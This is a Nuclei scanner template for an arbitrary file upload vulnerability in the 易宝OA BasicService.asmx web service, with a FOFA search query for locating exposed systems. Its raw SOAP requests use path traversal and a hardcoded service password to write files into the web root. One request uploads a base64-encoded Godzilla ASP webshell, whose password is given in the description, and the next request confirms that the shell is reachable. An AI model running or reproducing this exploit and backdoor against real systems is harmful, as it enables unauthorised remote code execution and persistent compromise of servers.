id: EPRO-OA-BasicService-upload

info:
  name: 易宝OA-BasicService.asmx任意文件上传漏洞
  author: linfeng7z
  severity: critical
  description: 直接写哥斯拉马，ASP_RAW，密码是mike@!3
  tags: epro,upload
  metadata:
    fofa-qeury: title="欢迎登录易宝OA系统"
    veified: true

variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}"

http:
  - raw:
      - |
        POST /WebService/BasicService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        SOAPAction: http://tempuri.org/UploadBillFile
        Content-Type: text/xml;charset=UTF-8
        
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
         <soapenv:Header/>
         <soapenv:Body>
            <tem:UploadBillFile>
               <!--type: base64Binary-->
               <tem:fs>aGVsbG8K</tem:fs>
               <!--type: string-->
               <tem:FileName>../../manager/{{file_name}}.aspx</tem:FileName>
               <!--type: string-->
               <tem:webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</tem:webservicePassword>
            </tem:UploadBillFile>
         </soapenv:Body>
        </soapenv:Envelope>

      - |
        GET /{{file_name}}.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0

      - |
        POST /WebService/BasicService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        SOAPAction: http://tempuri.org/UploadBillFile
        Content-Type: text/xml;charset=UTF-8
        
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
           <soapenv:Header/>
           <soapenv:Body>
              <tem:UploadBillFile>
                 <!--type: base64Binary-->
                 <tem:fs>PCUKU2V0IEFZUTdRID0gU2VydmVyLkNyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkRpY3Rpb25hcnkiKQoKRnVuY3Rpb24gQjlvRTE5KGNvbnRlbnQsaXNCaW4pCiAgICBkaW0gc2l6ZSxpLHJlc3VsdCxrZXlTaXplCiAgICBrZXlTaXplID0gbGVuKGtleSkKICAgIFNldCBDV0NqID0gQ3JlYXRlT2JqZWN0KCJBRE9EQi5TdHJlYW0iKQogICAgQ1dDai5DaGFyU2V0ID0gImlzby04ODU5LTEiCiAgICBDV0NqLlR5cGUgPSAyCiAgICBDV0NqLk9wZW4KICAgIGlmIElzQXJyYXkoY29udGVudCkgdGhlbgogICAgICAgIHNpemU9VUJvdW5kKGNvbnRlbnQpKzEKICAgICAgICBGb3IgaT0xIFRvIHNpemUKICAgICAgICAgICAgQ1dDai5Xcml0ZVRleHQgY2hydyhhc2NiKG1pZGIoY29udGVudCxpLDEpKSkKICAgICAgICBOZXh0CiAgICBlbmQgaWYKICAgIENXQ2ouUG9zaXRpb24gPSAwCiAgICBpZiBpc0JpbiB0aGVuCiAgICAgICAgQ1dDai5UeXBlID0gMQogICAgICAgIEI5b0UxOT1DV0NqLlJlYWQoKQogICAgZWxzZQogICAgICAgIEI5b0UxOT1DV0NqLlJlYWRUZXh0KCkKICAgIGVuZCBpZgoKRW5kIEZ1bmN0aW9uCiAgICBjb250ZW50ID0gcmVxdWVzdC5CaW5hcnlSZWFkKHJlcXVlc3QuVG90YWxCeXRlcykKICAgIGlmIGxlbihyZXF1ZXN0LkNvb2tpZXMuSXRlbSgibWlrZUAhMyIpKT4wICB0aGVuCiAgICAgICAgaWYgIElzRW1wdHkoU2Vzc2lvbigibG9hZFU1V20iKSkgdGhlbgogICAgICAgICAgICBjb250ZW50PUI5b0UxOShjb250ZW50LGZhbHNlKQogICAgICAgICAgICBTZXNzaW9uKCJsb2FkVTVXbSIpPWNvbnRlbnQKICAgICAgICAgICAgcmVzcG9uc2UuRW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBBWVE3US5BZGQgImxvYWRVNVdtIixTZXNzaW9uKCJsb2FkVTVXbSIpCiAgICAgICAgICAgIEV4ZWN1dGUoQVlRN1EoImxvYWRVNVdtIikpCiAgICAgICAgICAgIHJlc3VsdD1ydW4oY29udGVudCkKICAgICAgICAgICAgaWYgbm90IElzRW1wdHkocmVzdWx0KSB0aGVuCiAgICAgICAgICAgICAgICByZXNwb25zZS5CaW5hcnlXcml0ZSByZXN1bHQKICAgICAgICAgICAgZW5kIGlmCiAgICAgICAgZW5kIGlmCiAgICBlbmQgaWYKJT4=</tem:fs>
                 <!--type: string-->
                 <tem:FileName>../../manager/{{file_name}}.asp</tem:FileName>
                 <!--type: string-->
                 <tem:webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</tem:webservicePassword>
              </tem:UploadBillFile>
           </soapenv:Body>
        </soapenv:Envelope>

      - |
        GET /{{file_name}}.asp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, 'hello')"
          - "status_code_3 == 200 && status_code_4 == 200"
        condition: and